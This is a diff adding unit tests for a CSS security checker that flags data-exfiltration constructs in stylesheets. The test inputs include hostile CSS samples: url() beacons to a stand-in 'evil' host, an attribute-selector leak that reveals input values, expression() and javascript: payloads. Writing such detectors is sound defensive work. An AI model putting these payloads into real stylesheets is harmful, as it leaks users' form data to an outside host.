@@ -12,7 +12,7 @@ const { test, describe } = require('node:test');
 const assert = require('node:assert/strict');
 
 const {
-  findHexLiterals, findUnscopedSelectors, validateManifest,
+  findHexLiterals, findCssExfil, findUnscopedSelectors, validateManifest,
   skeletonInvokes, gateCss, gateComponent,
 } = require('../../../lib/layout/gate.js');
 const { scaffoldFiles, scaffoldDir, componentAsset, manifestObject } = require('../../../lib/layout/scaffold.js');
@@ -37,6 +37,33 @@ describe('gate — hex literals', () => {
   });
   test('ignores hex inside comments', () => {
     assert.equal(findHexLiterals('/* was #ff0000 */ a { color: var(--accent); }').length, 0);
+  });
+});
+
+describe('gate — CSS exfil (#616 T-CSS)', () => {
+  test('flags @import, expression(), -moz-binding, javascript: schemes', () => {
+    assert.deepEqual(
+      findCssExfil('@import "x.css"; a{behavior:expression(alert(1));-moz-binding:url(x);b:javascript:alert(1)}')
+        .map(f => f.rule).sort(),
+      ['css-binding', 'css-expression', 'css-import', 'css-scheme', 'css-url-remote'].sort(),
+    );
+  });
+  test('flags a remote url() beacon and an attribute-leak selector', () => {
+    assert.deepEqual(findCssExfil('a{background:url(//evil/?leak)}').map(f => f.rule), ['css-url-remote']);
+    assert.deepEqual(findCssExfil('[value^="a"]{background:url(https://evil/a)}').map(f => f.rule), ['css-url-remote']);
+  });
+  test('allows on-device url(): #fragment refs and inline data: URIs', () => {
+    assert.equal(findCssExfil('a{clip-path:url(#clip)}').length, 0);
+    // the shipped agenda data-SVG icon pattern (double-quoted, contains single quotes)
+    assert.equal(findCssExfil("a{--i:url(\"data:image/svg+xml,%3Csvg fill='%23000'%3E%3C/svg%3E\")}").length, 0);
+  });
+  test('ignores dangerous constructs inside comments', () => {
+    assert.equal(findCssExfil('/* @import "x"; url(//evil) */ a{color:var(--t)}').length, 0);
+  });
+  test('gateCss surfaces a remote url() as a blocking error', () => {
+    const r = gateCss('section.foo{background:url(//evil/?leak)}', 'foo');
+    assert.equal(r.ok, false);
+    assert.ok(r.findings.some(f => f.rule === 'css-url-remote' && f.level === 'error'));
   });
 });
 
